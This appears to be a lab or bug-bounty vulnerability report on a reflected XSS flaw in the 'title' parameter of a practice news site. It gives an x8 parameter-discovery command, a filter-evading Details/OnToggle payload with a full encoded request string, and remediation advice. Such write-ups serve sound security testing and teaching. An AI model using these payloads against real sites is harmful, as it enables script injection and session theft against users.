## Title
Reflected XSS - Multi-Parameter Filter Evasion

## Description

The application at `https://news.pwnedbox.site/` is vulnerable to Reflected Cross-Site Scripting (XSS) through the `title` GET parameter. Testing with x8 also identified `fname` and `lname` as reflected parameters.

A crafted input supplied through the `title` parameter was able to execute JavaScript in the browser despite the application's filtering. The successful execution was confirmed by a JavaScript confirmation dialog displaying `1`.

**Affected URL:** https://news.pwnedbox.site/  
**HTTP Method:** GET  
**Affected Parameter:** `title` (confirmed execution); `fname` and `lname` (reflection identified)

## Steps to Reproduce

1. Open `https://news.pwnedbox.site/` and confirm the reflected GET parameters using x8:
   ```bash
   x8 -u https://news.pwnedbox.site/ -X GET --disable-progress-bar --reflected-only -w params.txt
   ```
2. Use the `title` parameter with the following payload in the browser:
   ```html
   "><Details/Open/OnToggle%3D(confirm)(1)-->
   ```
3. Visit the crafted URL and observe the JavaScript confirmation dialog displaying `1`.

## POC (Proof of Concept)

**Lab Address:** https://news.pwnedbox.site/  
**HTTP Method:** GET  
**Vulnerable Parameter:** `title`

**Payload:**
```html
"><Details/Open/OnToggle%3D(confirm)(1)-->
```

**Request Parameter:**
```http
?title=%27%27%3C!--%3E%3C/Title%3E%3C/Text%20area%3E%3C/Script%3E%3C/Iframe%3E%3CDetails/Open/OnToggle%3D(confirm)(1)-->
```

**Observed Result:**

The browser displayed a JavaScript confirmation dialog containing `1`, confirming that JavaScript execution was possible through the reflected `title` parameter.

**Screenshot Evidence:**

1. x8 output identifying `fname`, `lname`, and `title` as reflected parameters on `news.pwnedbox.site`.
<img width="1492" height="769" alt="image" src="https://github.com/user-attachments/assets/0426117e-9b57-43ee-b290-9e3eabafc8a7" />

2. Browser showing the crafted `title` parameter in the URL.
<img width="1919" height="970" alt="image" src="https://github.com/user-attachments/assets/037f3d6c-f518-4bd1-949b-75330c12775c" />

3. JavaScript confirmation dialog displaying `1`.
<img width="1916" height="967" alt="image" src="https://github.com/user-attachments/assets/76a8c798-60eb-4570-8bf1-617ac864d2cd" />


## Impact

An attacker could craft a malicious URL and trick users into opening it. Depending on the application's session protections and execution context, this could lead to:

- Potential theft of session information if accessible to injected JavaScript.
- Potential impact on administrators who visit the affected page.
- Injection of fake login forms to trick users into submitting credentials.
- Unauthorized actions within a victim's authenticated session, depending on application protections.

## Remediation

1. Prevent HTML injection by applying context-aware output encoding to user-controlled values such as `title`, `fname`, and `lname`. Do not rely only on filtering HTML tags like `<script>`, `<img>`, or `<svg>`.
2. Do not rely on blocking JavaScript methods such as `alert()`, `confirm()`, or `prompt()`. Prevent script execution through proper encoding and sanitization.
3. If using PHP, apply `htmlspecialchars()` with appropriate flags and UTF-8 encoding before rendering user input into HTML.
4. Use a restrictive Content Security Policy (CSP) and consider Cloudflare WAF rules as an additional security layer. A WAF should not replace secure output handling.
